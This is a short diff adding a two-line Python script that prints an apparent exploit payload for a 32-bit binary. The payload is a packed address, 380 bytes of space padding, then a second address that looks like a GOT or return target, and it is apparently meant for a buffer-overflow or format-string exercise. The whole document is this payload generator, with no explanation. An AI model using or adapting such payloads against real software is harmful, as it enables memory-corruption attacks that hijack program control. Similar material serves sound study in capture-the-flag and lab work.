@@ -1,0 +1,2 @@
+data = "\xd8\x84\x04\x08" + " " * 380 + "\x14\xa0\x04\x08"
+print(data)
